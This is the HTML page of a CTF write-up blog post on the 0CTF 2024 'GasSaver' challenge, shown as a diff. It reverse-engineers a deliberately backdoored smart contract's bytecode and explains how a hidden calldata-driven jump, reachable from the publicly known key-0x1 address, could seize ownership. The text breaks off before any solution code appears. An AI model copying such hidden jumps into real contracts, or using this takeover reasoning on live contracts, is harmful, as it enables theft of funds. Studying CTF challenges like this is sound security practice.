@@ -1,0 +1,1558 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>0CTF 2024 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:url" content="https://chovid99.github.io/posts/0ctf-2024/">
+  <meta property="og:site_name" content="Chovid99&#39;s Blog">
+  <meta property="og:title" content="0CTF 2024">
+  <meta property="og:description" content="Writeup for 0CTF 2024">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-23T09:00:00+07:00">
+    <meta property="article:modified_time" content="2024-12-23T09:00:00+07:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="0CTF">
+    <meta property="article:tag" content="Blockchain">
+    <meta property="article:tag" content="Evm">
+    <meta property="article:tag" content="Rev">
+    <meta property="article:tag" content="Uniswap">
+    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
+  <meta name="twitter:title" content="0CTF 2024">
+  <meta name="twitter:description" content="Writeup for 0CTF 2024">
+      <meta name="twitter:site" content="@Chovid99">
+<meta name="application-name" content="Chovid99&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/0ctf-2024/" /><link rel="prev" href="https://chovid99.github.io/posts/seccon-ctf-13-quals/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "0CTF 2024",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/chovid99.github.io\/posts\/0ctf-2024\/"
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, 0CTF, blockchain, evm, rev, uniswap, jop, 2024","wordcount":  4822 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/0ctf-2024\/","datePublished": "2024-12-23T09:00:00+07:00","dateModified": "2024-12-23T09:00:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                
+                
+            </a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">0CTF 2024</h1><div class="post-meta">
+            <div class="post-meta-line">
+                </div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Dec 23, 2024">Dec 23, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4822 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;23 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#blockchain">Blockchain</a>
+      <ul>
+        <li><a href="#gassaver">GasSaver</a>
+          <ul>
+            <li><a href="#initial-analysis">Initial Analysis</a></li>
+            <li><a href="#solution">Solution</a>
+              <ul>
+                <li><a href="#uniswap-v3-callback">Uniswap V3 Callback</a></li>
+                <li><a href="#crafting-the-solution">Crafting the Solution</a></li>
+                <li><a href="#executing-the-solution">Executing the Solution</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/EV6g8TN.png" title="https://i.imgur.com/EV6g8TN.png" data-thumbnail="https://i.imgur.com/EV6g8TN.png" data-sub-html="<h2>0CTF 2024. We got fourth place</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/EV6g8TN.png"
+            data-srcset="https://i.imgur.com/EV6g8TN.png, https://i.imgur.com/EV6g8TN.png 1.5x, https://i.imgur.com/EV6g8TN.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/EV6g8TN.png" />
+    </a><figcaption class="image-caption">0CTF 2024. We got fourth place</figcaption>
+    </figure>
+<p>I played with the <strong>Blue Water</strong> team in 0CTF 2024. We got fourth place this time. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork!</p>
+<p>During the CTF, I only had time to work on one challenge called <code>GasSaver</code>, which was a <code>misc-rev-blockchain</code> challenge and had only 5 solves by the end. Below is the writeup for it:</p>
+<h1 id="blockchain">Blockchain</h1>
+<h2 id="gassaver">GasSaver</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Wait a sec… If you ain’t Vitalik, how the heck are you the owner?! 🤔</div>
+        </div>
+    </div>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>In this challenge, we were given a zip file containing the local setup for the challenge. Taking a quick look at the given <code>launcher.py</code>, we can see that the private infrastructure is not in a clean state, but rather forks the mainnet. Now, let&rsquo;s take a look at the <code>Challenge.sol</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IGasSaver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Challenge</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">gas_saver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_player</span><span class="p">)</span> <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">vitalik</span> <span class="o">=</span> <span class="mh">0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gas_saver</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">GasSaver</span><span class="p">(</span><span class="n">vitalik</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">player</span> <span class="o">=</span> <span class="n">_player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">player</span> <span class="o">!=</span> <span class="n">vitalik</span><span class="p">,</span> <span class="s">&#34;You are Vitalik, this game is too easy for you&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">IGasSaver</span><span class="p">(</span><span class="n">gas_saver</span><span class="p">).</span><span class="n">owner</span><span class="p">()</span> <span class="o">==</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">GasSaver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="s">hex&#34;5f3560e01c80638da5cb5b1461008257333214610623576104a6565b7f23b872dd000000000000000000000000000000000000000000000000000000005f5230600452336024526024356044525f5f60645f5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc25af1005b5f3560e01c806313af4035146104925761008b565b005b46545f5260205ff35b005b7c04000000000000000000000000000000000000000000000000000000005f523d5f60043e3d6004015ffdfd0000005b5f5f355f1a565b610127565b6101e8565b6102ae565b61039e565b61032a565b7365ddbabf2d31e444c0929bbe54f17eafe91a879a77496620796f75206c696b652074686973206368616c6c2c2077796f752063616e2073656e64206d6520736f6d65206574685b005b601a015f5f60a45f5f60023560601c5f5f7f022c0d9f000000000000000000000000000000000000000000000000000000005f7fa9059cbb000000000000000000000000000000000000000000000000000000005f5284600452346024525f5f60445f5f73a0b86991c6218b36c1d19d4a2e9eb0ce3606eb485af150526004526024526016357fffffffff00000000000000000000000000000000000000000000000000000000165f35461a523060445260806064525af16100805761008d565b6030017f128acb08000000000000000000000000000000000000000000000000000000005f5230600452602c3546355f1a5273fffd8963efd1fc6a506488495d951d5263988d2560645260a0608452602c60a4527fc02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000060c4526002357fffffffffffffffffffffffffffffffffffffffffffff00000000000000000000166105e960401b0160d85260405f60f05f5f600c355af13460201b5f515f0311166100805761008d565b6047017f128acb08000000000000000000000000000000000000000000000000000000005f523060045260433546355f1a5273fffd8963efd1fc6a506488495d951d5263988d2560645260a0608452602c60a452602c600360c43760405f60f05f5f6023355af1344635461a1b5f515f0311166100805761008d565b6047017f128acb08000000000000000000000000000000000000000000000000000000005f52306004524660245260433546355f1a1c5f036044526401000276a460645260a0608452602c60a452602c600360c43760405f60f05f5f6023355af1344635461a1b5f5110166100805761008d565b6047017f128acb08000000000000000000000000000000000000000000000000000000005f52306004524660245260433546355f1a526401000276a460645260a0608452602c60a452602c600360c43760405f60f05f5f6023355af1344635461a1b6020515f0311166100805761008d565b6047017f128acb08000000000000000000000000000000000000000000000000000000005f523060045260433546355f1a1c5f0360445273fffd8963efd1fc6a506488495d951d5263988d2560645260a0608452602c60a452602c600360c43760405f60f05f5f6023355af1344635461a1b60205110166100805761008d565f005b4654331461049e575f5ffd5b600435804655005b5f34116104905732737e5f4552091a69125d5dfcb7b8c2659029395bdf146104d2573346541461006b57005b60ae3560f05f501c60146084600c3760146098602c37600260ac605e3760605f207fff1f98431c8ad98523631ae4a59f267346ea31f98400000000000000000000005f52806015527fe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b5460355260555f2073ffffffffffffffffffffffffffffffffffffffff16331482577fffbaceb8ec6b9355dfc0269c18bac9d6e2bdc29c4f00000000000000000000005f526015527fe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b5460355260555f2073ffffffffffffffffffffffffffffffffffffffff16331490577c01000000000000000000000000000000000000000000000000000000005f5260045ffd5b7fa9059cbb000000000000000000000000000000000000000000000000000000005f52336004526024356024525f5f60445f5f608c355af1005b33737e5f4552091a69125d5dfcb7b8c2659029395bdf146100bd5761006b56&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assembly</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">sstore</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">owner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">return</span> <span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">bytecode</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="nf">mload</span><span class="p">(</span><span class="n">bytecode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see, there are two contracts here. The first one is the <code>Challenge</code> and the second one is <code>GasSaver</code>. Looking at the <code>Challenge.isSolved()</code> function, we can deduce that the goal for the challenge is to somehow take ownership of the <code>GasSaver</code> contract. So now, let&rsquo;s start to take a look at the <code>GasSaver</code> contract.</p>
+<p>The challenge only shares the runtime bytecode of the contract, so we will need to disassemble it first. Let&rsquo;s use <a href="https://app.dedaub.com/decompile" target="_blank" rel="noopener noreffer ">Dedaub EVM Decompiler</a> to analyze the bytecode. First, let&rsquo;s try to take a look at the decompiled result</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">setOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">STORAGE</span><span class="p">[</span><span class="n">CHAINID</span><span class="p">()]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">STORAGE</span><span class="p">[</span><span class="n">CHAINID</span><span class="p">()]</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">owner</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STORAGE</span><span class="p">[</span><span class="n">CHAINID</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Note: The function selector is not present in the original solidity code.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// However, we display it for the sake of completeness.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">__function_selector__</span><span class="p">(</span><span class="kt">bytes4</span> <span class="n">function_selector</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">varg1</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mh">0x8da5cb5b</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="mh">0x7e5f4552091a69125d5dfcb7b8c2659029395bdf</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">assert</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="mh">0x7e5f4552091a69125d5dfcb7b8c2659029395bdf</span> <span class="o">==</span> <span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">CALLDATACOPY</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">CALLDATACOPY</span><span class="p">(</span><span class="mi">44</span><span class="p">,</span> <span class="mi">152</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">CALLDATACOPY</span><span class="p">(</span><span class="mi">94</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">revert</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">STORAGE</span><span class="p">[</span><span class="n">CHAINID</span><span class="p">()]</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="mh">0x13af4035</span> <span class="o">==</span> <span class="n">function_selector</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">setOwner</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are two functions named <code>owner()</code> and <code>setOwner()</code>. However, we can only call <code>setOwner</code> if we are the owner itself, which seems impossible. Notice that there is some weird behavior happening in the function selector, where there appears to be a lot of hidden code that couldn&rsquo;t be fully decompiled. Looking at it at a glance, there is some condition checking regarding <code>tx.origin</code> and <code>msg.sender</code>, where we might be able to do other things with it. To understand more, let&rsquo;s examine the bytecode itself step by step.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    0x0: PUSH0     
+</span></span><span class="line"><span class="cl">    0x1: CALLDATALOAD
+</span></span><span class="line"><span class="cl">    0x2: PUSH1     0xe0
+</span></span><span class="line"><span class="cl">    0x4: SHR       
+</span></span><span class="line"><span class="cl">    0x5: DUP1      
+</span></span><span class="line"><span class="cl">    0x6: PUSH4     0x8da5cb5b
+</span></span><span class="line"><span class="cl">    0xb: EQ        
+</span></span><span class="line"><span class="cl">    0xc: PUSH2     0x82
+</span></span><span class="line"><span class="cl">    0xf: JUMPI     
+</span></span><span class="line"><span class="cl">   0x10: CALLER    
+</span></span><span class="line"><span class="cl">   0x11: ORIGIN    
+</span></span><span class="line"><span class="cl">   0x12: EQ        
+</span></span><span class="line"><span class="cl">   0x13: PUSH2     0x623
+</span></span><span class="line"><span class="cl">   0x16: JUMPI
+</span></span><span class="line"><span class="cl">   0x17: PUSH2     0x4a6
+</span></span><span class="line"><span class="cl">   0x1a: JUMP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Taking a look at the bytecode, when we run the contract, it first checks whether the passed function selector is <code>owner()</code> or not. Then, if it is not <code>owner()</code>, it checks whether <code>tx.origin == msg.sender</code>. If this is true, it jumps to address <code>0x623</code>, else it jumps to address <code>0x4a6</code>. Let&rsquo;s try to find out what it does, specifically examining the first branch first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  0x623: JUMPDEST  
+</span></span><span class="line"><span class="cl">  0x624: CALLER    
+</span></span><span class="line"><span class="cl">  0x625: PUSH20    0x7e5f4552091a69125d5dfcb7b8c2659029395bdf
+</span></span><span class="line"><span class="cl">  0x63a: EQ        
+</span></span><span class="line"><span class="cl">  0x63b: PUSH2     0xbd
+</span></span><span class="line"><span class="cl">  0x63e: JUMPI
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It checks whether the caller is <code>0x7e5f4552091a69125d5dfcb7b8c2659029395bdf</code>. If true, it jumps to <code>0xbd</code>. Below are the instructions starting at <code>0xbd</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">   0xbd: JUMPDEST  
+</span></span><span class="line"><span class="cl">   0xbe: PUSH0     
+</span></span><span class="line"><span class="cl">   0xbf: PUSH0     
+</span></span><span class="line"><span class="cl">   0xc0: CALLDATALOAD
+</span></span><span class="line"><span class="cl">   0xc1: PUSH0     
+</span></span><span class="line"><span class="cl">   0xc2: BYTE      
+</span></span><span class="line"><span class="cl">   0xc3: JUMP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that it will try to fetch the first byte of our <code>calldata</code>, then jump to it. This means that if we can call this contract with the correct <code>msg.sender</code>, we can set the first byte of our <code>calldata</code> to any <code>JUMPDEST</code> address (with the limitation that the address needs to be &lt;= <code>0xFF</code>). This means we can partially control where the execution should continue.</p>
+<p>Before continuing to check each available <code>JUMPDEST</code> that we can jump into, remember that the requirement is that <code>msg.sender</code> needs to be <code>0x7e5f4552091a69125d5dfcb7b8c2659029395bdf</code>. Googling that address, it turns out the address&rsquo;s private key is <a href="https://privatekeys.pw/key/0000000000000000000000000000000000000000000000000000000000000001" target="_blank" rel="noopener noreffer ">known</a>, which is <code>0x1</code>. This means that we can call the <code>GasSaver</code> contract as this address, so now let&rsquo;s start checking the available <code>JUMPDEST</code> locations we can use.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Available</span> <span class="n">JUMPDEST</span> <span class="o">&lt;=</span> <span class="mh">0xFF</span>
